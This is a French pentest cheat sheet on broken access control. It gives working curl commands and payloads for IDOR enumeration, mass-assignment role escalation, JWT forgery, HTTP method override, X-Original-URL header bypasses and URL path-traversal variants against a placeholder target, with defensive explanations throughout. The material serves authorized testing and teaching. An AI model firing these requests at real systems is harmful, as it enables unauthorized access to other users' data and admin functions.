# Broken Access Control — fiche de triche terrain

!!! warning "Cadre légal"
    Ces techniques ne doivent être mises en œuvre que dans un cadre légal explicite : laboratoire, CTF, ou test d'intrusion couvert par une autorisation écrite.

---

## 1. Exploitation IDOR (Insecure Direct Object References)

| Type | Principe | Exemple |
|---|---|---|
| **IDOR horizontal** | Accès aux données d'un autre utilisateur de même niveau de privilège | Voir la facture du client 1002 en étant le client 1001 |
| **IDOR vertical** | Accès à des fonctionnalités réservées à un niveau de privilège supérieur | Utilisateur standard accédant à une ressource réservée aux admins |

```bash
curl -H "Cookie: session=user1001" https://cible.com/api/invoice/1001    # Requête légitime
curl -H "Cookie: session=user1001" https://cible.com/api/invoice/1002    # Test IDOR horizontal
```

```bash
for id in $(seq 1000 1100); do
  curl -s -H "Cookie: session=user1001" "https://cible.com/api/invoice/$id" \
    -o "invoice_${id}.json" -w "ID %{id} : %{http_code}\n"
done
# Énumère une plage d'ID pour identifier les ressources accessibles sans contrôle d'appartenance
```

### Prédictibilité des paramètres

| Format d'identifiant | Prédictibilité | Exemple |
|---|---|---|
| ID séquentiel entier | Élevée | `?id=1042` → `?id=1043` trivialement devinable |
| UUID v4 (aléatoire) | Très faible | `?id=3f2b1c8e-...` — 122 bits d'entropie effective |
| UUID v1 (basé timestamp/MAC) | Modérée | Contient des informations temporelles partiellement déductibles |
| Hash court non salé | Variable | Brute-forçable si l'espace de valeurs sources est restreint |

!!! tip "UUID n'est pas une garantie de sécurité en soi"
    Un UUID rend l'énumération séquentielle impraticable, mais ne remplace jamais un contrôle d'autorisation côté serveur : un UUID divulgué (log, URL partagée, referer) reste directement exploitable sans aucune protection supplémentaire.

!!! warning "Contrôle d'accès manquant = vulnérabilité, quel que soit le format d'ID"
    Le véritable défaut n'est pas la prévisibilité de l'identifiant mais l'absence de vérification que l'utilisateur authentifié est bien autorisé à accéder à la ressource demandée.

---

## 2. Élévation de privilèges horizontale & verticale

### Manipulation du corps de requête

```json
// Requête légitime d'inscription
{ "username": "test", "email": "test@mail.com", "role": "user" }
```

```json
// Requête modifiée : injection d'un champ non prévu par l'interface visible
{ "username": "test", "email": "test@mail.com", "role": "admin" }
```

!!! warning "Mass assignment"
    Si le backend associe automatiquement chaque champ JSON reçu à un attribut du modèle utilisateur sans liste blanche explicite, un champ absent du formulaire visible peut néanmoins être accepté et traité par l'API.

### Manipulation d'en-têtes ou cookies

```bash
curl -H "X-User-Role: admin" https://cible.com/api/dashboard
# Teste si un en-tête custom non validé influence la logique d'autorisation

curl -H "Cookie: role=admin; session=abc123" https://cible.com/api/dashboard
# Teste un cookie de rôle manipulable côté client
```

### Manipulation de JWT

```text
Header : { "alg": "HS256", "typ": "JWT" }
Payload : { "user": "test", "role": "user" }
```

```bash
echo '{"user":"test","role":"admin"}' | base64 -w0
# Ré-encode un payload modifié, à réassembler avec le header et une signature (valide si "alg":"none" accepté)
```

| Technique JWT | Principe |
|---|---|
| `alg: none` | Certaines implémentations acceptent une signature vide si l'algorithme est déclaré "none" |
| Confusion RS256 → HS256 | Utilise la clé publique RSA (souvent accessible) comme clé secrète HMAC de signature |
| Absence de vérification de signature | Le serveur décode le payload sans jamais valider la signature associée |

!!! tip "Décoder rapidement un JWT"
    `echo "<partie_payload>" | base64 -d` (ajouter le padding `=` manquant si nécessaire) révèle directement le contenu du payload sans outil dédié.

---

## 3. Contournement de verbes et méthodes HTTP

```bash
curl -X GET https://cible.com/admin/users/1/delete       # Bloqué (403) sur la méthode attendue
curl -X POST https://cible.com/admin/users/1/delete       # Test avec une autre méthode
curl -X PUT https://cible.com/admin/users/1/delete         # Test avec PUT
curl -X DELETE https://cible.com/admin/users/1              # Test avec DELETE explicite sur la ressource
```

```bash
curl -X POST -H "X-HTTP-Method-Override: DELETE" https://cible.com/admin/users/1
# Certains frameworks interprètent cet en-tête pour simuler une méthode non supportée par le client
```

| En-tête d'override | Framework concerné (historique) |
|---|---|
| `X-HTTP-Method-Override` | Rails, Symfony, ASP.NET (selon configuration) |
| `X-HTTP-Method` | Variante moins courante |
| `X-Method-Override` | Variante alternative |
| `_method` (paramètre de formulaire) | Rails, Laravel (override via corps de requête) |

!!! warning "Contrôle d'accès appliqué à une seule méthode"
    Une règle de contrôle d'accès configurée uniquement pour `GET /admin/*` (ex : au niveau reverse-proxy ou middleware) peut laisser passer une requête `POST`/`PUT`/`DELETE` identique en chemin si la règle n'est pas explicitement méthode-agnostique.

---

## 4. Bypass de contrôle d'accès par réécriture d'URL

### En-têtes de proxying

```bash
curl -H "X-Original-URL: /admin/dashboard" https://cible.com/
# Certains reverse-proxy/frameworks routent en interne selon cet en-tête plutôt que le chemin réel de la requête

curl -H "X-Rewrite-URL: /admin/dashboard" https://cible.com/
# Variante équivalente selon l'implémentation du middleware
```

!!! warning "Écart entre couche de filtrage et couche applicative"
    Si le pare-feu applicatif ou le reverse-proxy filtre sur l'URL de la requête HTTP réelle, mais que l'application interne route ensuite selon un en-tête distinct, un contournement complet du contrôle d'accès frontal devient possible.

### Path traversal dans l'URL

```bash
curl https://cible.com/admin/..;/dashboard
# Le point-virgule après ".." peut être interprété comme un séparateur de paramètre matrix par certains serveurs Java/Tomcat, contournant un filtre sur le préfixe "/admin/"

curl https://cible.com/%2e%2e/admin/dashboard
curl https://cible.com/admin%2f..%2fdashboard
# Variantes encodées, à tester si la normalisation d'URL diffère entre la couche de filtrage et le serveur applicatif
```

| Variante de traversée | Cible typique |
|---|---|
| `/admin/..;/dashboard` | Tomcat / serveurs interprétant le point-virgule comme séparateur matrix |
| `/admin/./dashboard` | Filtres ne normalisant pas les segments `.` |
| `/admin//dashboard` | Double slash non normalisé avant comparaison de préfixe |
| `/ADMIN/dashboard` | Comparaison sensible à la casse côté filtre, insensible côté route applicative |

!!! tip "Toujours comparer filtrage et routage réel"
    Ce type de contournement exploite systématiquement un désaccord de normalisation entre deux composants distincts de la chaîne (proxy/WAF vs serveur applicatif). Tester chaque variante d'encodage face à la route protégée reste la seule méthode fiable de détection.
